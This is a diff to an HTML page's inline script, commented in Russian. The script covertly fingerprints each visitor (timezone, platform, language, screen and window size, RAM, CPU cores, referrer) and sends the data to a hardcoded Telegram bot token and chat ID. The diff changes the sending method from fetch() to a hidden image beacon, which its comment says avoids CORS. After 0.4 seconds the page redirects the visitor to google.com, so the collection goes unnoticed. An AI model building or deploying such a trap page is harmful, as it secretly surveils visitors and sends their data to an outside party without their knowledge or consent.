@@ -11,46 +11,34 @@
         const BOT_TOKEN = "9231529625:AAEMepewolQDytYwOum3aIrfIO1MBzJqous";
         const CHAT_ID = "8814781494";
 
-        // Собираем всю доступную информацию синхронно
-        const screenInfo = window.screen.width + "x" + window.screen.height + " (Цветов: " + window.screen.colorDepth + ")";
+        // Собираем ключевую информацию
+        const screenInfo = window.screen.width + "x" + window.screen.height;
         const windowInfo = window.innerWidth + "x" + window.innerHeight;
-        
-        let connectionInfo = "недоступно";
-        if (navigator.connection) {
-            connectionInfo = "Тип: " + (navigator.connection.effectiveType  'н/д') + ", Скорость: " + (navigator.connection.downlink  'н/д') + " Мбит/с";
-        }
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "н/д";
+        const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB+" : "н/д";
+        const cores = navigator.hardwareConcurrency || "н/д";
 
-        const languages = navigator.languages ? navigator.languages.join(", ") : navigator.language;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "неизвестно";
-        const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "неизвестно";
-        const cores = navigator.hardwareConcurrency || "неизвестно";
-        const touchPoints = navigator.maxTouchPoints || 0;
-
-        // Обычный текст без Markdown, чтобы Telegram не отклонял запросы со спецсимволами
-        const info = "🚨 Подробный отчет о посетителе\n\n" +
+        const info = "🚨 Отчет о посетителе:\n\n" +
                      "⏱ Время: " + new Date().toLocaleString() + "\n" +
                      "🌍 Часовой пояс: " + timezone + "\n" +
                      "💻 Платформа: " + navigator.platform + "\n" +
-                     "🗣 Языки: " + languages + "\n" +
+                     "🗣 Язык: " + navigator.language + "\n" +
                      "📺 Экран: " + screenInfo + "\n" +
                      "🪟 Окно: " + windowInfo + "\n" +
-                     "👆 Тач-точки: " + touchPoints + "\n" +
-                     "🧠 Память (RAM): " + ram + "\n" +
-                     "⚙️ Ядра CPU: " + cores + "\n" +
-                     "📶 Сеть: " + connectionInfo + "\n" +
-                     "🔗 Источник: " + (document.referrer || "прямой заход") + "\n" +
-                     "📌 Адрес: " + window.location.href + "\n" +
-                     "📱 User-Agent: " + navigator.userAgent;
+                     "🧠 ОЗУ: " + ram + "\n" +
+                     "⚙️ Ядра: " + cores + "\n" +
+                     "🔗 Источник: " + (document.referrer || "прямой заход");
 
         const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info);
 
-        // Отправляем запрос и гарантированно перенаправляем после его завершения
-        fetch(url)
-            .finally(function() {
-                setTimeout(function() {
-                    window.location.href = "https://google.com";
-                }, 500);
-            });
+        // Отправляем запрос через скрытое изображение (работает моментально, без зависаний и CORS)
+        const beacon = new Image();
+        beacon.src = url;
+
+        // ЖЕЛЕЗОБЕТОННЫЙ РЕДИРЕКТ: сработает ровно через 0.4 секунды, что бы ни случилось с сетью
+        setTimeout(function() {
+            window.location.href = "https://google.com";
+        }, 400);
     </script>
 </body>
 </html>
